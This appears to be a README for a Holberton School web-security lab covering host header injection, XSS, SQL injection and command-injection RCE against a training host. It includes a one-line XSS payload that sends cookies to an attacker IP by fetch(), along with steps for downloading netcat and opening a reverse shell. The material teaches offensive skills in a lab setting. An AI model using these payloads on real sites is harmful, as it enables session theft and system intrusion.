# 🔐 Web Application Security — 0x00 Web Fundamentals

This project explores fundamental web application vulnerabilities and associated exploitation techniques. It covers the most common and critical attacks in the field of web cybersecurity.

---

## 📋 Table of Contents

- [� Web Application Security — 0x00 Web Fundamentals](#-web-application-security--0x00-web-fundamentals)
  - [📋 Table of Contents](#-table-of-contents)
  - [📖 Description](#-description)
  - [🎯 Learning Objectives](#-learning-objectives)
  - [🛠️ Prerequisites](#️-prerequisites)
    - [Required Tools](#required-tools)
    - [Environment](#environment)
    - [Prior Knowledge](#prior-knowledge)
  - [📁 Project Structure](#-project-structure)
  - [💻 Exercises](#-exercises)
    - [1. Can We Trust Our Hosts?](#1-can-we-trust-our-hosts)
    - [2. Catch The FLAG #1](#2-catch-the-flag-1)
    - [3. Stealing Cookies from Managers](#3-stealing-cookies-from-managers)
    - [4. Catch The FLAG #2](#4-catch-the-flag-2)
    - [5. Can we trust our Managers?](#5-can-we-trust-our-managers)
    - [6. Catch The FLAG #3](#6-catch-the-flag-3)
    - [7. Admin Panel RCE](#7-admin-panel-rce)
    - [8. Catch The FLAG #4](#8-catch-the-flag-4)
  - [🔧 Installation and Configuration](#-installation-and-configuration)
    - [Test Environment Configuration](#test-environment-configuration)
    - [Required Tools](#required-tools-1)

---

## 📖 Description

This module covers essential web vulnerabilities identified in the **OWASP Top 10**, with a practical focus on:

- **Host Header Injection** — HTTP header manipulation
- **Cross-Site Scripting (XSS)** — Malicious JavaScript code injection
- **SQL Injection** — Database exploitation
- **Remote Code Execution (RCE)** — Remote command execution

---

## 🎯 Learning Objectives

By the end of this project, you will be able to:

- ✅ Identify and exploit **Host Header Injection** vulnerabilities  
- ✅ Create effective **XSS payloads** to steal cookies  
- ✅ Exploit **SQL injections** to access sensitive data  
- ✅ Perform **RCE attacks** on poorly secured admin interfaces  
- ✅ Understand the impact and protection measures for each vulnerability  

---

## 🛠️ Prerequisites

### Required Tools
- `curl` — For HTTP requests
- `Python 3` — For local servers
- `sqlmap` — For SQL exploitation
- `netcat (nc)` — For reverse shells
- Firefox/Chrome — With developer tools

### Environment
- Access to Holberton Ubuntu environment
- VPN connection to test network
- Configured `tun0` interface

### Prior Knowledge
- HTTP protocol basics
- Understanding of cookies and sessions
- JavaScript fundamentals
- Basic SQL concepts

---

## 📁 Project Structure

```text
0x00_web_fundamentals/
├── README.md                           # This file
├── 1-host_header_injection.sh          # Host Header exploitation script
├── 2-flag.txt                          # Flag captured via Host Header Injection
├── 3-xss_payload.txt                   # XSS payload for cookie theft
├── 4-flag.txt                          # Flag captured via XSS
├── 5-ticket.txt                        # HTTP request for SQLi
├── 6-flag.txt                          # Flag captured via SQL Injection
├── 7-rce_payload.txt                   # Payload for Remote Code Execution
├── 8-flag.txt                          # Final flag via RCE
└── HTTP_Host_Header_Attack_Documentation.md
```

---

## 💻 Exercises

### 1. Can We Trust Our Hosts?

🎯 **Objective:** Exploit a Host Header Injection vulnerability

📝 **Description:** Create a bash script that exploits Host header injection using `curl` to redirect users to a malicious server.

⚙️ **Usage:**
```bash
./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password email=test@test.hbtn
```

🔍 **Technical Details:**
- Target Endpoint: `http://web0x00.hbtn/reset_password`
- Parameters: New host, target URL, form data
- Expected Result: Redirection to attacker-controlled server

---

### 2. Catch The FLAG #1

🎯 **Objective:** Capture the first flag via Host Header Injection

📝 **Description:** Use the previous exploitation to intercept the reset link and obtain the flag displayed in the header after login.

🔧 **Required Configuration:**

Identify your IP on the network:
```bash
ip addr show tun0
```

Start a local HTTP server:
```bash
python3 -m http.server -b :: 80
```

Monitor bot connections.

📍 **Key Points:**
- Check the source code for known customer emails
- The bot will automatically click on the reset link
- The flag appears in the `<header>` section after customer login

---

### 3. Stealing Cookies from Managers

🎯 **Objective:** Create an XSS payload to steal cookies

📝 **Description:** Develop a malicious JavaScript payload that exploits XSS vulnerabilities in a ticket system to steal visitor cookies.

📋 **Constraints:**
- Format: `<script>// JavaScript Code</script>`
- Code as short as possible
- No variable declarations allowed
- Use the `fetch()` function
- Send cookies in the request pathname

💡 **Format Example:**
```html
<script>fetch('http://[your_ip]/.session='+document.cookie)</script>
```

🎯 **Target Endpoint:** `http://web0x00.hbtn/login`

---

### 4. Catch The FLAG #2

🎯 **Objective:** Obtain the second flag via XSS

📝 **Description:** Use the previous XSS payload to capture support cookies and access the flag displayed in the header.

⚙️ **Cookie Manipulation (Firefox):**
1. Press `F12` (developer tools)
2. Go to **Storage** tab
3. Select **Cookies**
4. Modify the cookie value

⚠️ **Important:** The XSS payload will also load on your side!

🎯 **Target Endpoint:** `http://web0x00.hbtn/home`

---

### 5. Can we trust our Managers?

🎯 **Objective:** Exploit SQL injection in the Ticket ID parameter

📝 **Description:** Create a text file containing the HTTP request to exploit potential SQL injection in the `Ticket ID` parameter.

🔧 **Method:**
- Use developer tools → **Network**
- Capture the HTTP request
- Save it in `5-ticket.txt`

🛠️ **Test with sqlmap:**
```bash
sqlmap -r 5-ticket.txt
```

🎯 **Target Endpoint:** `http://web0x00.hbtn/support`

---

### 6. Catch The FLAG #3

🎯 **Objective:** Obtain the third flag via SQL Injection

📝 **Description:** Use `sqlmap` with the file from the previous task to extract admin information and access the admin panel.

💡 **Hints:**
- Use `--dump` to extract the administrators table
- Admin login page: `http://web0x00.hbtn/admin`
- The flag displays in the `<header>` section after admin login

🎯 **Target Endpoint:** `http://web0x00.hbtn/admin`

---

### 7. Admin Panel RCE

🎯 **Objective:** Exploit a ping function to achieve remote code execution

📝 **Description:** Create a payload that exploits insufficient input validation in the admin ping function to download and execute netcat.

📋 **Payload Requirements:**
- No unnecessary spaces
- Download static `nc` from GitHub
- Grant execute permissions
- Display version with `-V` option

---

### 8. Catch The FLAG #4

🎯 **Objective:** Capture the final flag via reverse shell

📝 **Description:** Use netcat from the previous task to establish a reverse shell and find the flag in root's home directory.

🔧 **Steps:**
- Start a listener for reverse shell
- Use `./nc` to establish the connection
- Search for the flag in `/root/`

---

## 🔧 Installation and Configuration

### Test Environment Configuration

Connect to Ubuntu environment:
```bash
ssh user@cod.hbtn
```

Network interface verification:
```bash
ip addr show tun0
```

Local server configuration:
```bash
python3 -m http.server -b :: 80
```

### Required Tools

```bash
sudo apt update
sudo apt install curl python3 netcat sqlmap firefox
```

---

🎓 Project completed as part of **Holberton School — Cybersecurity curriculum**

- **Repository:** `holbertonschool-cyber_security`
- **Directory:** `web_application_security/0x00_web_fundamentals`
